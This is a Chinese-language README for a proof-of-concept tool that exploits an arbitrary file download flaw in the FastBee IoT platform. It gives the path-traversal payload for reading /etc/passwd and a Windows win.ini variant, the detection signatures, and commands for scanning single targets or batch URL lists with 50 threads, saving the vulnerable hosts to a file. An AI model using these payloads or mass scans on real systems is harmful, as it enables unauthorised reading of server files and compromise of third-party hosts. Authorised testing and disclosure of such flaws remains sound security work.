# FastBee 开源物联网平台任意文件下载漏洞 POC 工具

## 工具简介
本工具用于检测 **FastBee 开源物联网平台** 是否存在 `/prod-api/iot/tool/download` 接口任意文件下载漏洞。该漏洞可通过构造特殊请求参数，读取服务器敏感文件（如 `/etc/passwd`），对目标系统的安全性造成严重威胁。

工具支持单 URL 检测和批量 URL 检测，采用多线程（`multiprocessing.dummy.Pool`）提升批量检测效率，并自动将存在漏洞的目标保存至结果文件，便于后续分析。


## 漏洞原理
FastBee 开源物联网平台的 `/prod-api/iot/tool/download` 接口未对 `fileName` 参数进行严格的输入验证和路径过滤，允许攻击者通过 **路径穿越（../）** 构造恶意请求，读取服务器任意文件。

本工具通过以下核心逻辑验证漏洞：
1. 向目标 URL 发送基础请求，确认目标服务可正常访问（状态码 200）；
2. 构造路径穿越 payload：`/prod-api/iot/tool/download?fileName=/../../../../../../../../../etc/passwd`；
3. 若请求结果中包含 Linux 系统敏感文件 `/etc/passwd` 的特征内容（`root:x:0:0:root:/root:/bin/bash`），则判定目标存在漏洞。


## 环境依赖
| 依赖库         | 作用说明                          | 安装命令                  |
|----------------|-----------------------------------|---------------------------|
| `requests`     | 发送 HTTP/HTTPS 请求              | `pip install requests`    |
| `urllib3`      | 处理 HTTPS 证书警告（禁用不安全警告） | 依赖 `requests`，通常无需单独安装 |
| Python 版本    | 3.x 及以上（推荐 3.7+）           | -                         |


## 工具使用
### 1. 命令行参数说明
| 参数        | 简写 | 作用                          | 示例                          |
|-------------|------|-------------------------------|-------------------------------|
| `--url`     | `-u` | 单目标 URL 检测                | `-u http://192.168.1.100`     |
| `--file`    | `-f` | 批量检测（指定 URL 列表文件）  | `-f url_list.txt`             |
| `--help`    | `-h` | 查看工具帮助信息              | `-h`                          |


### 2. 基础使用场景
#### 场景 1：单目标检测
检测单个 FastBee 平台是否存在漏洞：
```bash
python fastbee_file_download_poc.py -u http://192.168.1.100:8080
```

#### 场景 2：批量目标检测
1. 准备 URL 列表文件（如 `url_list.txt`），每行一个目标 URL（支持带端口、不带协议头格式）：
   ```txt
   http://192.168.1.100
   https://fastbee.example.com:8443
   192.168.1.101:8080
   ```
2. 执行批量检测命令（默认 50 线程，可在代码 `Pool(50)` 处修改线程数）：
   ```bash
   python fastbee_file_download_poc.py -f url_list.txt
   ```


### 3. 输出说明
| 输出标识 | 含义                                  |
|----------|---------------------------------------|
| `[+]`    | 目标存在任意文件下载漏洞              |
| `[-]`    | 目标不存在漏洞                        |
| `[*]`    | 目标访问异常（如状态码非 200），需手工验证 |

**结果文件**：存在漏洞的目标会自动追加保存至当前目录的 `result1.txt` 文件中。


## 注意事项
1. **合法性声明**：
   - 本工具仅用于 **合法授权的安全测试**（如企业内部资产自查、经客户授权的渗透测试），禁止用于未授权的攻击行为。
   - 滥用本工具造成的法律责任（如破坏计算机系统、侵犯数据隐私等），由使用者自行承担。

2. **网络环境**：
   - 若目标使用 HTTPS 协议且证书无效，工具已通过 `urllib3.disable_warnings` 禁用证书验证警告，无需额外处理。
   - 批量检测时，建议根据目标网络环境调整线程数（代码中 `Pool(50)`），避免因线程过多导致目标服务器拒绝服务或本地 IP 被封禁。

3. **漏洞局限性**：
   - 本工具仅验证 Linux 系统的 `/etc/passwd` 文件，若目标为 Windows 系统，需修改 payload（如读取 `C:\Windows\win.ini`）并调整特征匹配内容。
   - 若目标存在 WAF（Web 应用防火墙），可能会拦截 payload 请求，导致检测结果不准确，需结合手工测试进一步验证。


## 代码修改建议
1. **调整线程数**：
   批量检测时，若目标数量少或网络不稳定，可减少线程数（如 `Pool(10)`）；若目标数量多且网络通畅，可适当增加（如 `Pool(100)`），修改位置：
   ```python
   mp=Pool(50)  # 此处数字即为线程数
   ```

2. **适配 Windows 目标**：
   若需检测 Windows 系统的 FastBee 平台，修改 `payload` 为 Windows 敏感文件路径，并调整特征匹配内容：
   ```python
   # 修改 payload（读取 Windows 系统文件）
   payload="/prod-api/iot/tool/download?fileName=/../../../../../../../../../Windows/win.ini"
   # 修改特征匹配（win.ini 文件特征）
   if 'FOR 16-BIT APPLICATIONS' in res2.text:
   ```

3. **自定义结果文件路径**：
   若需修改漏洞结果保存路径，修改代码中 `open('result1.txt','a',encoding='utf-8')` 中的文件名（如 `open('vuln_targets.txt','a',...)`）。


## 免责声明
本工具的开发和发布仅用于 **网络安全技术研究与学习**，旨在帮助企业和安全人员发现并修复系统漏洞，提升网络安全防护能力。

任何个人或组织在使用本工具前，必须确保已获得目标系统的 **合法授权**。若因未授权使用本工具造成任何违法违规行为或损失，均由使用者自行承担全部责任，工具开发者不承担任何法律责任。
